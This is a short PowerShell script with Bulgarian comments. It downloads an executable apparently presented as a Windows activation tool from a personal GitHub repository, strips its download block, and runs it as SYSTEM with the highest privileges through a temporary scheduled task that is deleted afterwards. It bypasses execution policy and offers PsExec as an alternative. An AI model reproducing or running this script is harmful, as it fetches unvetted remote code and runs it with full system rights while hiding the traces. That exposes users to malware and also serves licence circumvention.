$url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"
$tempFile = "$env:TEMP\Microsoft Activation Scripts.exe"

Invoke-WebRequest -Uri $url -OutFile $tempFile
Unblock-File -Path $tempFile

# Създаване на PS1 скрипт, който ще се изпълни от SYSTEM
$psScript = @"
Start-Process -FilePath '$tempFile' -WorkingDirectory '$env:TEMP' -Wait
"@

$psScriptFile = "$env:TEMP\run_as_system.ps1"
Set-Content -Path $psScriptFile -Value $psScript

# Използване на PsExec от Sysinternals (трябва да го имате)
# psexec.exe -s -i powershell.exe -ExecutionPolicy Bypass -File `"$psScriptFile`"

# Или алтернативно с schtasks
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$psScriptFile`""
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "RunMASElevated" -Action $action -Trigger $trigger -Principal $principal -Force
Start-ScheduledTask -TaskName "RunMASElevated"
Start-Sleep -Seconds 10
Unregister-ScheduledTask -TaskName "RunMASElevated" -Confirm:$false
